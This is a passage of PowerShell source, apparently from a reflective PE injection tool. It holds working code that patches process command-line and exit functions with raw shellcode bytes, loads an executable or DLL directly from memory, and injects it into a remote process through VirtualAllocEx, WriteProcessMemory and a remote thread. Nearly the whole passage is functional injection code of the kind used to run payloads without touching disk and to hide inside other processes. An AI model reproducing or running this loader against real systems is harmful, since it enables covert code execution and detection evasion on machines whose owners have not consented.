        [UInt32]$OldProtectFlag = 0
        
        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""Kernel32.dll"")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw ""Kernel32 handle null""
        }
        
        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke(""KernelBase.dll"")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw ""KernelBase handle null""
        }

        
        
        
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, ""GetCommandLineA"")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, ""GetCommandLineW"")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw ""GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)""
        }

        
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 
        }
        $Shellcode1 += 0xb8
        
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        
        
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw ""Call to VirtualProtect failed""
        }
        
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw ""Call to VirtualProtect failed""
        }
        
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        
        
        
        
        
        
        $DllList = @(""msvcr70d.dll"", ""msvcr71d.dll"", ""msvcr80d.dll"", ""msvcr90d.dll"", ""msvcr100d.dll"", ""msvcr110d.dll"", ""msvcr70.dll"" `
            , ""msvcr71.dll"", ""msvcr80.dll"", ""msvcr90.dll"", ""msvcr100.dll"", ""msvcr110.dll"")
        
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, ""_wcmdln"")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, ""_acmdln"")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    ""Error, couldn't find _wcmdln or _acmdln""
                }
                
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                
                
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw ""Call to VirtualProtect failed""
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw ""Call to VirtualProtect failed""
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        
        
        
        
        

        $ReturnArray = @()
        $ExitFunctions = @() 
        
        
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke(""mscoree.dll"")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw ""mscoree handle null""
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, ""CorExitProcess"")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw ""CorExitProcess address not found""
        }
        $ExitFunctions += $CorExitProcessAddr
        
        
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""ExitProcess"")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw ""ExitProcess address not found""
        }
        $ExitFunctions += $ExitProcessAddr
        
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            
            
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""ExitThread"")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw ""ExitThread address not found""
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw ""Call to VirtualProtect failed""
            }
            
            
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            
            
            
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        

        Write-Output $ReturnArray
    }
    
    
    
    
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw ""Call to VirtualProtect failed""
            }
            
            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    
    
    
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                
                
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }
        
        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        
        
        Write-Verbose ""Getting basic PE information from the file""
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning ""PE is not compatible with DEP, might cause issues"" -WarningAction Continue
            $NXCompatible = $false
        }
        
        
        
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""IsWow64Process"")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw ""Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit""
            }
            
            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw ""Call to IsWow64Process failed""
            }
            
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            
            
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw ""PowerShell must be same architecture (x86/x64) as PE being loaded and remote process""
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw ""PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)""
        }
        

        
        Write-Verbose ""Allocating memory for the PE and write its headers to memory""
        
        
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $ForceASLR) -and (-not $PESupportsASLR))
        {
            Write-Warning ""PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)"" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose ""PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash.""
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error ""Cannot use ForceASLR when loading in to a remote process."" -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error ""PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process"" -ErrorAction Stop
        }

        $PEHandle = [IntPtr]::Zero              
        $EffectivePEHandle = [IntPtr]::Zero     
        if ($RemoteLoading -eq $true)
        {
            
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw ""Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use""
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }
        
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        { 
            Throw ""VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free).""
        }       
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        
        Write-Verbose ""Getting detailed PE information from the headers loaded in memory""
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose ""StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)""
        
        
        
        Write-Verbose ""Copy PE sections in to memory""
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        
        
        
        Write-Verbose ""Update memory addresses based on where the PE was actually loaded in memory""
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

        
        
        Write-Verbose ""Import DLL's needed by the PE we are loading""
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }
        
        
        
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose ""Update memory protection flags""
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose ""PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute""
            }
        }
        else
        {
            Write-Verbose ""PE being loaded in to a remote process, not adjusting memory permissions""
        }
        
        
        
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw ""Unable to write shellcode to remote process memory.""
            }
        }
        
        
        
        if ($PEInfo.FileType -ieq ""DLL"")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose ""Calling dllmain so the DLL knows it has been loaded""
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                
                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw ""Unable to allocate memory in the remote process for shellcode""
                }
                
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw ""Unable to write shellcode to remote process memory.""
                }

                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
                }
                
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq ""EXE"")
        {
            
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            
            
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose ""Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in.""

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose ""EXE thread has completed.""
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }
    
    
    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )
        
        
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose ""Done unloading the libraries needed by the PE""
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning ""Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways"" -WarningAction Continue
                }
                
                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning ""Unable to free library: $ImportDllPath. Continuing anyways."" -WarningAction Continue
                }
                
